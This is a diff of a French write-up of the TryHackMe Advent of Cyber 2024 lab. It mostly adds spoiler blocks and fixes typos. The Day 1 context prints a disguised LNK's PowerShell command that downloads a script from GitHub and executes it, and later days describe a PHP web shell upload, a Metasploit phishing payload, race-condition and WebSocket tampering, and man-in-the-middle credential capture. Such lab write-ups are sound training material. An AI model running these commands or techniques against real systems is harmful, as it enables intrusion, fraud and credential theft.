@@ -59,13 +59,13 @@ Lien vers l'épreuve : <https://tryhackme.com/room/adventofcyber2024>
 
 Ce premier challenge nous demande d'enquêter sur un site web de téléchargement de vidéos YouTube au format `mp3` ou `mp4` : *The Glitch's All-in-One Converter*
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_website.png" caption="Site web permettant de télécharger des vidéos YouTube" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_website.png" caption="Site web permettant de télécharger des vidéos YouTube" %}
 
 Nous utilisons le lien YouTube fourni dans le texte du défi (<https://www.youtube.com/watch?v=dQw4w9WgXcQ>) afin de tester les fonctionnalités de l'outil.
 
 Nous choisissons le téléchargement en `mp4` et nous récupérons le fichier "super sécurisé"
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_download.png" caption="Téléchargement du fichier super sécurisé" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_download.png" caption="Téléchargement du fichier super sécurisé" %}
 
 Nous décompressons le fichier obtenu, et nous constatons d'abord que les fichiers sont aux formats `mp3` et non `mp4` comme souhaité.
 
@@ -76,14 +76,17 @@ Archive:  download.zip
  extracting: somg.mp3
 ```
 
-Une rapide analyse du fichier `song.mp3` nous indique que malgré le choix de la vidéo en entrée, nous n'avons pas été *Rick Rolled*. A la place nous avons un rap de Noël.
+Une rapide analyse du fichier `song.mp3` nous indique que malgré le choix de la vidéo en entrée, nous n'avons pas été [*Rick Rolled*](https://fr.wikipedia.org/wiki/Rickroll). A la place nous avons un rap de Noël.
 
 ```bash
-exiftool song.mp3 
+exiftool song.mp3
+```
+
+{% capture spoil %}
 ExifTool Version Number         : 11.88
 File Name                       : song.mp3
 Directory                       : .
-#[...expurgé pour brièveté...]
+[...expurgé pour brièveté...]
 ID3 Size                        : 2176
 Artist                          : T[...expurgé...]y
 Album                           : Rap
@@ -95,20 +98,24 @@ Track                           : 0/1
 Comment                         : 
 Date/Time Original              : 2024
 Duration                        : 0:03:11 (approx)
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 En analysant de la même façon le fichier `somg.mp3` nous observons cette fois qu'il ne s'agit pas d'un fichier sonore, mais d'un lien permettant de télécharger et lancer un fichier PowerShell depuis Github
 
 ```bash
-exiftool somg.mp3 
+exiftool somg.mp3
+```
+
+{% capture spoil %}
 ExifTool Version Number         : 11.88
 File Name                       : somg.mp3
 Directory                       : .
-#[...expurgé pour brièveté...]
+[...expurgé pour brièveté...]
 File Type                       : LNK
 File Type Extension             : lnk
 MIME Type                       : application/octet-stream
-#[...expurgé pour brièveté...]
+[...expurgé pour brièveté...]
 Target File DOS Name            : powershell.exe
 Drive Type                      : Fixed Disk
 Volume Label                    : 
@@ -117,7 +124,8 @@ Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1
 Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
 Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
 Machine ID                      : win-base-2019
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 En nous rendant sur le lien Github, nous pouvons constater qu'il s'agit d'un script permettant de contacter un serveur C2 (*Command & Control*) entraînant la compromission de la machine à des fins de minage de cryptomonnaie
 
@@ -166,13 +174,13 @@ Send-InfoToC2Server
 
 En poussant l'analyse du compte Github, nous trouvons le nom de la personne qui se cache derrière le pseudo M.M.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_GithubUser.png" caption="Informations sur M.M." %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_GithubUser.png" caption="Informations sur M.M." %}
 
 En recherchant les *Issues* ouverts par cet utilisateur, nous trouvons un autre dépôt ayant un certain nombre de *Commits* que je ne dévoilerai pas pour conserver une part de challenge !
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_issue.png" caption="Une issue ouverte par l'utilisateur" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_issue.png" caption="Une issue ouverte par l'utilisateur" %}
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_repo.png" caption="Le nombre de commits est la dernière question du jour" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_repo.png" caption="Le nombre de commits est la dernière question du jour" %}
 
 ## Jour 2 : Le faux positif d'une personne, est le pot-pourri d'un autre
 
@@ -195,17 +203,17 @@ Pour simplifier la lecture, nous choisissons d'afficher les valeurs :
 
 Pour trouver le compte à l'origine des connexions échouées, nous pouvons utiliser le bouton `-` pour exclure les connexions réussies et ne conserver que les échecs.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_failure.png" caption="Un seul compte à l'origine des échecs de connexions" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_failure.png" caption="Un seul compte à l'origine des échecs de connexions" %}
 
 Nous observons plus de 6700 échecs sur la période indiquée.
 
 Si nous filtrons les résultats sur l'adresse IP 10.0.11.11, nous n'observons pas de schéma particulier. En revanche, si nous excluons cette adresse, nous constatons un pic d'échecs provenant d'une autre adresse pouvant s'apparenter à une tentative de force brute.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_suspicious_ip.png" caption="Adresse IP suspecte" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_suspicious_ip.png" caption="Adresse IP suspecte" %}
 
 En filtrant à présent sur les succès de cette adresse IP vers le serveur ADM-01, nous notons une connexion réussie.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_adm_success.png" caption="Connexion réussie à un serveur d'administration" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_adm_success.png" caption="Connexion réussie à un serveur d'administration" %}
 
 En regardant les actions réalisées depuis cette adresse IP suspecte, il apparaît une commande PowerShell qu'il convient de déchiffrer :
 
@@ -221,7 +229,7 @@ Pour faciliter le déchiffrement, nous utilisons l'opération *Magic* en mode in
 Install-WindowsUpdate -AcceptAll -AutoReboot
 ```
 
-Il s'agit finalement d'un faux positif. Quelqu'un essaie a mis à jour les serveurs afin de mitiger les vulnérabilités.
+Il s'agit finalement d'un faux positif. Quelqu'un essaie de mettre à jour les serveurs afin de mitiger les vulnérabilités.
 
 ## Jour 3 : Même si je voulais y aller, leurs vulnérabilités ne le permettraient pas
 
@@ -240,7 +248,7 @@ Pour faciliter la lecture, nous choisissons d'afficher les champs suivants :
 
 La première étape consiste à trouver le chemin du fichier `shell.php` qui a été téléversé. Pour cela, nous utiliserons la requête KQL (Kibana Query Language) : `message:"shell.php"`
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_shell.png" caption="Informations concernant le shell et l'adresse IP qui l'a utilisé" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_shell.png" caption="Informations concernant le shell et l'adresse IP qui l'a utilisé" %}
 
 Nous allons à présent utiliser le code {% include dictionary.html word="PHP" %} fourni dans le défi pour reproduire l'attaque {% include dictionary.html word="RCE" %} observée.
 
@@ -269,19 +277,19 @@ Nous commençons par accéder à l'url `hxxp[://]frostypines[.]thm/admin/rooms[.
 
 Grâce à l'analyse des logs, nous savons que le shell a été uploadé en tant qu'image pour illustrer une chambre à louer sur le site. Nous allons donc créer une nouvelle chambre afin de pouvoir déposer notre fichier.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell.png" caption="Création d'une nouvelle chambre avec la page PHP" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell.png" caption="Création d'une nouvelle chambre avec la page PHP" %}
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell2.png" caption="Chambre créée" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell2.png" caption="Chambre créée" %}
 
 Nous pouvons désormais accéder à notre shell via l'url `hxxp[://]frostypines[.]thm/[...expurgé...]/shell[.]php`
 
 En listant les éléments présents dans le dossier actuel, nous y trouvons le fichier `flag.txt` que nous devons trouver
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_list.png" caption="Le fichier flag.txt est présent dans le dossier" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_list.png" caption="Le fichier flag.txt est présent dans le dossier" %}
 
 Nous pouvons lire le contenu du fichier pour conclure ce troisième jour.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_flag.png" caption="Le flag concluant le défi" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_flag.png" caption="Le flag concluant le défi" %}
 
 ## Jour 4 : Je suis tout atomique à l'intérieur
 
@@ -306,7 +314,7 @@ Après avoir nettoyer les logs de l'outil [Sysmon](https://learn.microsoft.com/f
 
 De retour dans l'outil Event Viewer, dans le dossier Sysmon, nous observons la présence d'un événement ayant créé deux fichiers, dont un est le flag de la première question.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_sysmon.png" caption="Logs de la création des outils de phishing" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_sysmon.png" caption="Logs de la création des outils de phishing" %}
 
 Nous récupérons le contenu du fichier texte créé :
 
@@ -315,22 +323,25 @@ Get-Content 'C:\Users\Administrator\AppData\Local\temp\PhishingAttachment.txt'
 THM{[...expurgé...]}
 ```
 
-Pour trouver quel identifiant ATT&CK est en jeu, nous nous rendons dans la section [*Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
+Pour trouver quel identifiant ATT&CK est en jeu, nous nous rendons dans la section [*Command and Scripting Interpreter*](https://attack.mitre.org/techniques/T1059/)
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_mitre.png" caption="Sélection de la catégorie MITRE" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_mitre.png" caption="Sélection de la catégorie MITRE" %}
 
 Le numéro de la catégorie apparaît dans l'encadré récapitulant la technique :
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_CSI.png" caption="Informations sur la technique Command and Scripting Interpreter" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_CSI.png" caption="Informations sur la technique Command and Scripting Interpreter" %}
 
 En ouvrant les différentes sous-techniques associées nous trouvons celle qui est dédiée à Windows Command Shell :
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_subtechnique.png" caption="Sous-technique applicable à Windows Command Shell" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_subtechnique.png" caption="Sous-technique applicable à Windows Command Shell" %}
 
 Pour trouver le nom du test Atomic à simuler, nous utilisons la commande `Invoke-AtomicTest` avec le flag `-ShowDetailsBrief`
 
-```txt
-Invoke-AtomicTest T[...expurgé...] -ShowDetailsBrief
+```powershell
+Invoke-AtomicTest T[...expurge...] -ShowDetailsBrief
+```
+
+{% capture spoil %}
 PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
 
 [...expurgé...]-1 Create and Execute Batch Script
@@ -338,14 +349,18 @@ PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
 [...expurgé...]-3 Suspicious Execution via Windows Command Shell
 [...expurgé...]-4 [...expurgé...]
 [...expurgé...]-5 Command Prompt read contents from CMD file and execute
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 McSkidy souhaitant mettre en place un test imitant un *ransomware*, le test numéro **4** est celui qui sera joué.
 
 En regardant les détails de ce test, nous pouvons trouver le nom du fichier qui sera nécessaire :
 
-```txt
-Invoke-AtomicTest T[...expurgé...] -TestNumbers 4 -ShowDetails
+```powershell
+Invoke-AtomicTest T[...expurge...] -TestNumbers 4 -ShowDetails
+```
+
+{% capture spoil %}
 PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
 
 [********BEGIN TEST*******]
@@ -377,12 +392,13 @@ Get Prereq Command:
 new-item #{file_to_print} -value "This file has been created by T[...expurgé...] Test 4" -Force | Out-Null
 Get Prereq Command (with inputs):
 new-item C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt -value "This file has been created by T[...expurgé...] Test 4" -Force | Out-Null
-[!!!!!!!!END TEST!!!!!!!] 
-```
+[!!!!!!!!END TEST!!!!!!!]
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous lançons la simulation, et à la fin nous avons un prompt nous proposant d'enregistrer un fichier PDF. Lorsque nous l'ouvrons, nous obtenons le dernier flag pour ce jour.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_flag.png" caption="Drapeau trouvé dans le fichier PDF créé à la fin du test" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_flag.png" caption="Drapeau trouvé dans le fichier PDF créé à la fin du test" %}
 
 ## Jour 5 : *SOC-mas XX-what-ee?*
 
@@ -423,13 +439,13 @@ En ajoutant le `DOCTYPE` et l'`ENTITY` nous pouvons ouvrir le fichier système `
 
 Pour commencer, nous accédons au site de vente de produits de Noël, nous ajoutons un objet dans notre *wishlist* et nous nous rendons dans notre panier (*Cart*) pour valider.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_cart.png" caption="Wishlist créée à valider" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_cart.png" caption="Wishlist créée à valider" %}
 
 Lorsque nous procédons au *Checkout*, le site nous indique que nous venons de créer le 21ème vœu. Mais lorsque nous cliquons sur le lien, nous avons un message d'erreur indiquant que seuls les elfes du Père Noël ont accès aux vœux.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_wish.png" caption="Notre panier est enregistré en tant que 21ème souhait" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_wish.png" caption="Notre panier est enregistré en tant que 21ème souhait" %}
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_error.png" caption="Nous n'avons pas accès à nos souhaits" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_error.png" caption="Nous n'avons pas accès à nos souhaits" %}
 
 Par chance, nous avons utilisé [Burp Suite](https://portswigger.net/burp) afin d'intercepter les requêtes {% include dictionary.html word="HTTP" %}. L'outil nous permet de constater qu'une action sur la page `/wishlist.php` utilise le format {% include dictionary.html word="XML" %}.
 
@@ -570,7 +586,7 @@ YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp1FAB
 3      Job3            BackgroundJob   Running       True            localhost            ...
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-06_yara.png" caption="Message d'alerte et flag" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-06_yara.png" caption="Message d'alerte et flag" %}
 
 Nous lançons à présent le programme `floss.exe` qui nous permettra d'extraire les chaînes de caractères présentes dans le malware
 
@@ -597,7 +613,9 @@ Nous commençons l'analyse par la commande suivante, et nous y trouvons les acti
 
 ```bash
 jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "User_Agent"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .userAgent //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
+```
 
+{% capture spoil %}
 Event_Time            Event_type        Event_Name                           Event_Source                         User_Name  Source_IP        User_Agent
 2024-11-28T15:22:12Z  AwsApiCall        HeadBucket                           s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
 2024-11-28T15:22:23Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
@@ -614,7 +632,8 @@ Event_Time            Event_type        Event_Name                           Eve
 2024-11-28T15:22:13Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
 2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
 2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Explications de la commande :
 
@@ -633,26 +652,35 @@ Afin de déterminer le nom de l'utilisateur créé par `mcskidy`, nous utilisero
 cat cloudtrail_log.json | jq | grep -C5 requestParameters | grep -v null
 
 jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Created_username"],(.Records[] | select(.userIdentity.userName == "mcskidy") | select(.eventName == "CreateUser") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.userName //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
-
-Event_Time            Event_type  Event_Name  Event_Source       User_Name  Source_IP     Created_username
-2024-11-28T15:21:35Z  AwsApiCall  CreateUser  iam.amazonaws.com  mcskidy    53.94.201.69  glitch
 ```
 
-Le compte `glitch` a été créé par `mcskidy` peut de temps avant les manipulations suspectes.
+{% capture spoil %}
+Event_Time            Event_type  Event_Name  Event_Source       User_Name  Source_IP     Created_username
+2024-11-28T15:21:35Z  AwsApiCall  CreateUser  iam.amazonaws.com  mcskidy    53.94.201.69  glitch
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Le compte `glitch` a été créé par `mcskidy` peu de temps avant les manipulations suspectes.
 
 En analysant ce nouveau compte, nous constatons qu'il dispose de droits élevés sur AWS :
 
 ```bash
 jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Privileges"],(.Records[] | select(.eventSource == "iam.amazonaws.com") | select(.eventName == "AttachUserPolicy") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.policyArn //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
+```
+
+{% capture spoil %}
 Event_Time            Event_type  Event_Name        Event_Source       User_Name  Source_IP     Privileges
 2024-11-28T15:21:36Z  AwsApiCall  AttachUserPolicy  iam.amazonaws.com  mcskidy    53.94.201.69  arn:aws:iam::aws:policy/[...expurgé...]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Mais il semblerait que quelque chose ne soit pas normal : l'adresse IP utilisé par `mcskidy` en temps normal ne correspond pas à celle utilisée lors de la création de l'utilisateur `glitch`. C'est l'adresse IP de `mayor_malware` !
 
 ```bash
 jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP"],(.Records[] | select(.eventName == "ConsoleLogin") | [.eventTime,.eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
+```
 
+{% capture spoil %}
 Event_Time            Event_type        Event_Name    Event_Source          User_Name      Source_IP
 2024-11-28T15:18:37Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
 2024-11-28T15:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        5[...expurgé...]9
@@ -667,18 +695,23 @@ Event_Time            Event_type        Event_Name    Event_Source          User
 2024-11-24T02:28:17Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
 2024-11-25T21:48:22Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
 2024-11-26T22:55:51Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Enfin, pour obtenir le numéro de compte de Mayor Malware, nous utilisons une {% include dictionary.html word="regex" %} permettant de trouver les informations au bon format (4 ensembles de 4 chiffres, ensembles séparés par des espaces) :
 
 ```bash
 grep -E '([0-9]{4}\s){3}[0-9]{4}' rds.log | grep -i 'mayor'
+```
+
+{% capture spoil %}
 2024-11-28T15:23:02.605Z 2024-11-28T15:23:02.605700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 193.45)
 2024-11-28T15:23:02.792Z 2024-11-28T15:23:02.792161Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 998.13)
 2024-11-28T15:23:02.976Z 2024-11-28T15:23:02.976943Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 865.75)
 2024-11-28T15:23:03.161Z 2024-11-28T15:23:03.161700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 409.54)
 [...expurgé pour brièveté...]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 8 : Shellcodes du monde, rassemblement
 
@@ -938,7 +971,7 @@ msf6 exploit(multi/handler) > exploit
 
 Nous allons maintenant envoyer le fichier malicieux à notre victime, et attendre qu'il soit utilisé.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-10_mail.png" caption="Un mail de phishing plus vrai que nature... Ou presque" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-10_mail.png" caption="Un mail de phishing plus vrai que nature... Ou presque" %}
 
 Après quelques minutes, nous obtenons finalement une communication entrante :
 
@@ -1109,15 +1142,15 @@ Read 273 packets.
 
 Nous commençons par ouvrir le site a attaqué, et nous arrivons sur une page de connexion.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_login.png" caption="Page de connexion" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_login.png" caption="Page de connexion" %}
 
 Puisqu'il s'agit d'un test en boîte grise, nous disposons d'identifiants.
 
 Nous tentons un transfert de 500$ vers le compte suivant (111 puisque nous sommes 110)
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_transfert.png" caption="Transfert de 500$ vers le compte 111" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_transfert.png" caption="Transfert de 500$ vers le compte 111" %}
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_success.png" caption="Les 500$ ont bien été transférés" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_success.png" caption="Les 500$ ont bien été transférés" %}
 
 Via BurpSuite, nous envoyons la requête correspondante vers le *Repeater* afin de vérifier si une protection contre les duplications d'opération existe.
 
@@ -1144,11 +1177,11 @@ Nous envoyons cette attaque en créant un groupe contenant cette même requête 
 
 Lorsque nous rafraîchissons notre tableau de bord, nous contatons que toutes les requêtes ont abouti, et que le solde du compte de test est maintenant **-4500$**
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_tester_balance.png" caption="Les transferts ont tous abouti avec BurpSuite" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_tester_balance.png" caption="Les transferts ont tous abouti avec BurpSuite" %}
 
 Nous répétons ces manipulations depuis le compte 101 de Glitch afin de récupérer le flag.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_flag.png" caption="Transfert de plus de 2000$ grâce aux transferts en parallèle pour obtenir le flag" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_flag.png" caption="Transfert de plus de 2000$ grâce aux transferts en parallèle pour obtenir le flag" %}
 
 ## Jour 13 : C'est arrivé sans mémoire tampon ! C'est arrivé sans lag
 
@@ -1160,15 +1193,15 @@ Nous ouvrons BurpSuite et son navigateur pour capturer le trafic des websockets.
 
 Lorsque nous cliquons sur suivre la voiture de Glitch (*Track*), nous interceptons une communication vers le serveur indiquant `42["track",{"userId":"5"}]`. Nous remplaçons la valeur `userId` par 8, et nous cliquons sur *forward* pour envoyer la requête modifiée ainsi que les suivantes jusqu'à obtention de la confirmation que nous suivons la voiture de Mayor Malware.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_tracking.png" caption="Premier flag fourni par Mayor Malware" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_tracking.png" caption="Premier flag fourni par Mayor Malware" %}
 
 A présent, nous allons tester la modification du `userId` lors de l'envoi d'un message.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_test.png" caption="Message que nous enverrons pour tester la manipulation" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_test.png" caption="Message que nous enverrons pour tester la manipulation" %}
 
 Nous réactivons l'interception du trafic, puis nous envoyons le message ci-dessus. Nous obtenons la communication vers le serveur `42["send_msg",{"txt":"My test message","sender":"5"}]` et nous modifions le numéro de `sender` par la valeur 8 correspondante à Mayor Malware.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_message.png" caption="Le message a bien été envoyé en tant que Mayor Malware et non Glitch" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_message.png" caption="Le message a bien été envoyé en tant que Mayor Malware et non Glitch" %}
 
 ## Jour 14 : Même si nous sommes horriblement mal gérés, il n'y aura pas de visage triste durant SOC-mas
 
@@ -1178,13 +1211,13 @@ Nous réactivons l'interception du trafic, puis nous envoyons le message ci-dess
 
 Lorsque nous ouvrons le site, nous avons un avertissement nous indiquant que le certificat est autosigné. Bien que ce soit fréquent sur des sites intranet d'entreprise, cette pratique peut représenter un danger si le site est exposé au public, ce qui est le cas ici
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_selfsigned.png" caption="Le certificat est autosigné et n'est pas reconnu par le navigateur" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_selfsigned.png" caption="Le certificat est autosigné et n'est pas reconnu par le navigateur" %}
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_crt_ca.png" caption="Le certificat est signé par la même organisation que le détenteur du site" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_crt_ca.png" caption="Le certificat est signé par la même organisation que le détenteur du site" %}
 
 Nous allons nous insérer dans le trafic en nous faisant passer pour la passerelle de Wareville afin d'intercepter les informations de connexion des utilisateurs.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_middle.png" caption="On s'insère au milieu du trafic de Wareville" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_middle.png" caption="On s'insère au milieu du trafic de Wareville" %}
 
 > Le certificat en place étant auto-signé, les utilisateurs sont habitués à "accepter le risque" en se connectant à ce site. Il n'y aura pas de changement dans leur habitude en utilisant le certificat auto-signé de BurpSuite
 
@@ -1206,7 +1239,7 @@ username=snowballelf&password=[...expurgé...]
 
 En nous connectant avec ces identifiants, nous pouvons récupérer le premier flag :
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_elf_flag.png" caption="Connexion avec les identifiants d'un elfe" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_elf_flag.png" caption="Connexion avec les identifiants d'un elfe" %}
 
 Nous observons également les identifiants de Marta Mayware :
 
@@ -1224,7 +1257,7 @@ username=marta_mayware&password=[...expurgé...]
 
 Nous accédons ainsi à la page d'administration, récupérons le flag, et pouvons même tenter d'annuler G-day (la tentation était trop forte) :
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_admin_flag.png" caption="Connexion avec les identifiants d'un administrateur" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_admin_flag.png" caption="Connexion avec les identifiants d'un administrateur" %}
 
 ## Jour 15 : Aussi odieux soit-il, il n'y a pas d'endroit comme le Contrôleur de Domaine
 
@@ -1234,15 +1267,15 @@ Nous accédons ainsi à la page d'administration, récupérons le flag, et pouvo
 
